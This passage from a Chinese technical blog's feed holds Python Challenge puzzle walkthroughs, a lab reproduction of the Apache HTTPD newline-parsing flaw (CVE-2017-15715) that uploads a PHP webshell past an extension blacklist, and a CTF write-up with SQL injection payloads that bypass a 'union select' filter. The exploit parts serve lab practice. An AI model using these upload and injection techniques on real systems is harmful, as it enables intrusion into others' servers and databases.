class="number">133</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">107</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">140</span>,<span class="number">95</span>,<span class="number">138</span>,<span class="number">86</span>,<span class="number">141</span>,<span class="number">79</span>,<span class="number">149</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">90</span>,<span class="number">165</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">109</span>,<span class="number">171</span>,<span class="number">107</span>,<span class="number">161</span>,<span class="number">111</span>,<span class="number">156</span>,<span class="number">113</span>,<span class="number">170</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">118</span>,<span class="number">208</span>,<span class="number">117</span>,<span class="number">223</span>,<span class="number">121</span>,<span class="number">239</span>,<span class="number">128</span>,<span class="number">251</span>,<span class="number">133</span>,<span class="number">259</span>,<span class="number">136</span>,<span class="number">266</span>,<span class="number">139</span>,<span class="number">276</span>,<span class="number">143</span>,<span class="number">290</span>,<span class="number">148</span>,<span class="number">310</span>,<span class="number">151</span>,<span class="number">332</span>,<span class="number">155</span>,<span class="number">348</span>,<span class="number">156</span>,<span class="number">353</span>,<span class="number">153</span>,<span class="number">366</span>,<span class="number">149</span>,<span class="number">379</span>,<span class="number">147</span>,<span class="number">394</span>,<span class="number">146</span>,<span class="number">399</span>]  </span><br><span class="line">second = [<span class="number">156</span>,<span class="number">141</span>,<span class="number">165</span>,<span class="number">135</span>,<span class="number">169</span>,<span class="number">131</span>,<span class="number">176</span>,<span class="number">130</span>,<span class="number">187</span>,<span class="number">134</span>,<span class="number">191</span>,<span class="number">140</span>,<span class="number">191</span>,<span class="number">146</span>,<span class="number">186</span>,<span class="number">150</span>,<span class="number">179</span>,<span class="number">155</span>,<span class="number">175</span>,<span class="number">157</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">157</span>,<span class="number">159</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">164</span>,<span class="number">159</span>,<span class="number">175</span>,<span class="number">159</span>,<span class="number">181</span>,<span class="number">157</span>,<span class="number">191</span>,<span class="number">154</span>,<span class="number">197</span>,<span class="number">153</span>,<span class="number">205</span>,<span class="number">153</span>,<span class="number">210</span>,<span class="number">152</span>,<span class="number">212</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">146</span>,<span class="number">218</span>,<span class="number">143</span>,<span class="number">220</span>,<span class="number">132</span>,<span class="number">220</span>,<span class="number">125</span>,<span class="number">217</span>,<span class="number">119</span>,<span class="number">209</span>,<span class="number">116</span>,<span class="number">196</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">114</span>,<span class="number">172</span>,<span class="number">114</span>,<span class="number">167</span>,<span class="number">112</span>,<span class="number">161</span>,<span class="number">109</span>,<span class="number">165</span>,<span class="number">107</span>,<span class="number">170</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">89</span>,<span class="number">164</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">148</span>,<span class="number">87</span>,<span class="number">140</span>,<span class="number">96</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">141</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">113</span>,<span class="number">129</span>,<span class="number">118</span>,<span class="number">117</span>,<span class="number">128</span>,<span class="number">114</span>,<span class="number">137</span>,<span class="number">115</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">155</span>,<span class="number">115</span>,<span class="number">158</span>,<span class="number">121</span>,<span class="number">157</span>,<span class="number">128</span>,<span class="number">156</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">136</span>,<span class="number">156</span>,<span class="number">136</span>]  </span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>))  </span><br><span class="line">draw = ImageDraw.Draw(img)  </span><br><span class="line">draw.polygon(first, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">draw.polygon(second, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></p>
<p>结果是： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231228.png" /></p>
<p>牛的英文是 cow，修改 url 为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/cow.html</span><br></pre></td></tr></table></figure>
<p>提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hmm. it&#x27;s a male.</span><br></pre></td></tr></table></figure></p>
<p>也就是公牛，英语为 bull。修改 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cow.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/bull.html</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如果出现验证的框，输入 level 8 得到的用户名和密码即可。</p>
</blockquote>
<p>其实，只有 first 也能画出这头牛，而 second 画出来的长这样： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231802.png" /></p>
<p>不知道是否可以理解为 <strong>性器官？？？</strong></p>
<h1 id="level-10">level 10</h1>
<h2 id="题目信息-10">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202104810.png" /></p>
<p>注意到 <code>len(a[30]) = ?</code>。查看页面源码，发现图片中的牛可以点击，并且得到一个数组 a： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = [1, 11, 21, 1211, 111221,</span><br></pre></td></tr></table></figure></p>
<p>通过观察，发现这个数组并没有闭合。那么思路就是：<strong>通过数组的某种规律得到 a[30] 的值，然后再计算长度。</strong></p>
<p>通过查资料发现，这是外观序列。</p>
<blockquote>
<p>外观序列（Look-and-say sequence），是指以下特点的整数序列：</p>
<p>1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, ……</p>
<p>它以数字1开始，序列的第n+1项是对第n项的描述。比如第2项是2个1，所以下一项（第三项）就是21。又比如第5项是111221，描述就是3个1，2个2，1个1， 所以下一项就是312211。</p>
</blockquote>
<h2 id="方法-1-1">方法 1</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span>(<span class="params">res</span>):</span>  </span><br><span class="line">    index, <span class="built_in">next</span> = <span class="number">0</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line"> <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res):  </span><br><span class="line">	count = <span class="number">1</span>  </span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res) - <span class="number">1</span> <span class="keyword">and</span> res[index] == res[index+<span class="number">1</span>]:  </span><br><span class="line">		count += <span class="number">1</span>  </span><br><span class="line">		index += <span class="number">1</span>  </span><br><span class="line">	<span class="built_in">next</span> += <span class="built_in">str</span>(count) + res[index]  </span><br><span class="line">	index += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countAndSay</span>(<span class="params">length</span>):</span>  </span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):  </span><br><span class="line">		res = getNext(res)</span><br><span class="line">	<span class="keyword">return</span>(res) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(countAndSay(<span class="number">31</span>)))</span><br></pre></td></tr></table></figure></p>
<p><strong>（注意，一定是 count 在前，res[index] 在后）</strong></p>
<p>得到结果：5808</p>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/bull.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/5808.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法-2-1">方法 2</h2>
<p>利用正则表达式替代循环。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, <span class="string">&#x27;111221&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(&#x27;1&#x27;, &#x27;11&#x27;), (&#x27;2&#x27;, &#x27;2&#x27;), (&#x27;1&#x27;, &#x27;&#x27;)]</span><br></pre></td></tr></table></figure></p>
<p>（假设元组第一个元素为 i，第二个元素为 j）那么与方法 1相比： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value == res[index]</span><br><span class="line">count == len(str(i+j))</span><br></pre></td></tr></table></figure></p>
<p>因此，最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):  </span><br><span class="line">    res = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">len</span>(i+j))+i <span class="keyword">for</span> i, j <span class="keyword">in</span> re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, res)])  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure></p>
<h1 id="level-11">level 11</h1>
<h2 id="题目信息-11">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111336.png" /></p>
<p>注意网站名字：<code>odd even</code></p>
<p>本题只有两个信息：</p>
<ol type="1">
<li>图片</li>
<li><code>odd even</code> 也就是奇数，偶数</li>
</ol>
<p>猜测：<strong>把图中奇数和偶数的像素点分开</strong></p>
<h2 id="方法-12">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_11/cave.jpg&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">odd = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line">even = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):  </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">		pixel = img.getpixel((i, j))  </span><br><span class="line">        <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">1</span>: <span class="comment"># odd  </span></span><br><span class="line">			odd.putpixel((i, j), pixel)  </span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># even</span></span><br><span class="line">			even.putpixel((i, j), pixel)  </span><br><span class="line"></span><br><span class="line">odd.show()  </span><br><span class="line">even.show()</span><br></pre></td></tr></table></figure></p>
<p>得到两张图片： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111705.png" /></p>
<p>右边那张中有 <code>evil</code> 字样。因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/5808.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/evil.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-12">level 12</h1>
<h2 id="题目信息-12">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091240.png" /></p>
<p>查看源码，点击图片链接发现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/evil1.jpg</span><br></pre></td></tr></table></figure></p>
<p>后面有数字，猜想把数字改一下会不会有其他图片，果不其然。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091406.png" alt="evil2.jpg" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091619.png" /></p>
<p>以上分别是2，3。注意到2，将后缀修改会下载得到一个文件。其实4还是有的，访问的时候并不是显示没有文件，而是显示 <code>因存在错误而无法显示</code>，利用下面命令访问： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -u huge:file http://www.pythonchallenge.com/pc/return/evil4.jpg</span><br></pre></td></tr></table></figure></p>
<p>得到一句话 <code>Bert is evil! go back!</code>。这么看来，信息应该就在刚刚下载的文件里。</p>
<p>注意到第一张图片中将牌分为了 5 叠（dealing the cards into 5 stacks），根据网站名 <code>deal evil</code> ，那么猜测：<strong>将下载的文件数据也分为 5 叠。</strong></p>
<h2 id="方法-13">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&#x27;attachments/level_12/evil2.gfx&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  </span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;attachments/level_12/%d.jpg&#x27;</span> % i, <span class="string">&#x27;wb&#x27;</span>).write(data[i::<span class="number">5</span>])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203093800.png" /></p>
<p>由于 4 被划掉，不做考虑。分别是：<code>dis, pro, port, ional</code> ，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/evil.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-13">level 13</h1>
<h2 id="题目信息-13">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203101659.png" /></p>
<p>查看页面源码发现： - <code>phone that &lt;remote /&gt; evil</code> - <code>5</code> 可以点击，结果为：<code>faultCode 105 faultString XML error 5: empty document</code></p>
<p>查询 stack overflow，这个报错的信息是因为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It looks from the response like you didn&#x27;t submit an xml &#x27;request&#x27; document to the url. XMLRPC requires that you post a request in the form of commands via an xml file.</span><br><span class="line"></span><br><span class="line">没有提交 xml 请求。</span><br></pre></td></tr></table></figure></p>
<p>故可以利用 xmlrpc 库请求。</p>
<h2 id="方法-14">方法</h2>
<p>先查看有哪些方法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client  </span><br><span class="line">connect = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://www.pythonchallenge.com/pc/phonebook.php&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(connect.system.listMethods())</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">结果：</span><br></pre></td></tr></table></figure> ['phone', 'system.listMethods', 'system.methodHelp', 'system.methodSignature', 'system.multicall', 'system.getCapabilities'] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（注意到 `phone`）</span><br><span class="line"></span><br><span class="line">查看 phone 方法的**帮助**和**输入与输出**：</span><br><span class="line">```python</span><br><span class="line">print(connect.system.methodHelp(&#x27;phone&#x27;))  </span><br><span class="line">print(connect.system.methodSignature(&#x27;phone&#x27;))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Returns the phone of a person</span><br><span class="line">[[&#x27;string&#x27;, &#x27;string&#x27;]]</span><br></pre></td></tr></table></figure></p>
<p>该方法需要输入一个字符串，返回一个字符串。那么输入的字符串应该是人名，而返回的字符串应该是对应的电话号码。注意到上一关的 <code>Bert is evil! go back!</code>，那么这里应该输入 <code>Bert</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(connect.phone(<span class="string">&#x27;Bert&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">555-ITALY</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>冷知识：<code>555</code> basically means "fake phone numbers" in US...</p>
</blockquote>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/italy.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-14">level 14</h1>
<h2 id="题目信息-14">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110227.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110246.png" /></p>
<p>访问 wire.png ，发现真正的尺寸是 10000 * 1。</p>
<p>总结一下信息：</p>
<ol type="1">
<li><code>100*100 = (100+99+99+98) + (...</code></li>
<li>wire.png 是 <code>10000*1</code>，而显示出来的是 <code>100*100</code></li>
<li>HTML 标题为 <code>walk around</code></li>
</ol>
<p>猜测：<strong>将 <code>10000*1</code> 的图片按某种方式卷起来，形成一个 <code>100*100</code> 的图片，卷的方式应该就是 <code>(100+99+99+98) + (..</code>。就是类似这样：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111001.png" /> （先向右100，然后向下99，向左99，向上98；向右98 ...）</p>
<h2 id="方法-15">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_14/wire.png&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.size, img.mode, img.<span class="built_in">format</span>)  </span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">100</span>, <span class="number">100</span>))  </span><br><span class="line">d = <span class="number">200</span>  </span><br><span class="line">delta = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]  </span><br><span class="line">x, y, i = -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 因为第一次要 +100，所以 x 初始为 -1</span></span><br><span class="line"><span class="keyword">while</span> d/<span class="number">2</span> &gt; <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> delta:  </span><br><span class="line">        steps = d // <span class="number">2</span></span><br><span class="line">		<span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(steps):  </span><br><span class="line">            x, y = x + v[<span class="number">0</span>], y + v[<span class="number">1</span>]  </span><br><span class="line">            out.putpixel((x, y), img.getpixel((i, <span class="number">0</span>)))  </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">		d -= <span class="number">1</span>  </span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111203.png" /></p>
<p>当访问 <code>http://www.pythonchallenge.com/pc/return/cat.html</code> 时，出现：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206223856.png" /></p>
<p>因此用 uzi 替代 cat，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cat.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/uzi.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-15">level 15</h1>
<h2 id="题目信息-15">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225138.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225159.png" /></p>
<p>信息总结：</p>
<ol type="1">
<li>日历上显示的应该是 <code>1xx6</code> 年；</li>
<li>注意最右下角的其实是2月，有 29 天，说明应该是闰年；</li>
<li>他不是最年轻的，而是第二年轻的</li>
<li>要做的事：为明天买花</li>
<li>网页标题：<code>whom?</code></li>
</ol>
<p>猜测：需要通过生日找出这个人是谁。</p>
<h2 id="方法-16">方法</h2>
<ol type="1">
<li>找出 1006 到 1996 之间的满足 1.26 是周一的所有闰年。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime, calendar  </span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1006</span>, <span class="number">1997</span>, <span class="number">10</span>):  </span><br><span class="line">    d = datetime.date(year, <span class="number">1</span>, <span class="number">26</span>)  </span><br><span class="line">    <span class="keyword">if</span> d.isoweekday() == <span class="number">1</span> <span class="keyword">and</span> calendar.isleap(year):  <span class="comment"># 判断是否为闰年，1，26是否为周一</span></span><br><span class="line">        <span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1176-01-26</span><br><span class="line">1356-01-26</span><br><span class="line">1576-01-26</span><br><span class="line">1756-01-26</span><br><span class="line">1976-01-26</span><br></pre></td></tr></table></figure></p>
<p>然后，根据 "他不是最年轻的，而是第二年轻的"，猜测应该是 1756 年，最年轻的是1956年。，再根据"要做的事：为明天买花"，猜测他的生日应该是 1756.1.27，百度发现，那天是莫扎特（Mozart）的生日，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/uzi.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/mozart.html</span><br></pre></td></tr></table></figure></p>
<h1 id="附录">附录</h1>
<ol type="1">
<li>网址：<a href="http://www.pythonchallenge.com/">python challenge</a></li>
<li>解法：<a href="https://www.hackingnote.com/en/python-challenge-solutions/overview">python challenge solutions</a></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
<p>成功获得 webshell。</p>
<h1 id="总结">总结</h1>
<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
<h1 id="资源">资源</h1>
<ol type="1">
<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
<h1 id="第一次sql注入">第一次sql注入</h1>
<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
<h2 id="获取字段数">获取字段数</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
<h2 id="测试显示位">测试显示位</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
<p>上面的信息很丰富：</p>
<ul>
<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
<li>显示位为 2</li>
<li>地址为：<strong>/var/www/html/view.php</strong></li>
</ul>
<h2 id="常规注入">常规注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
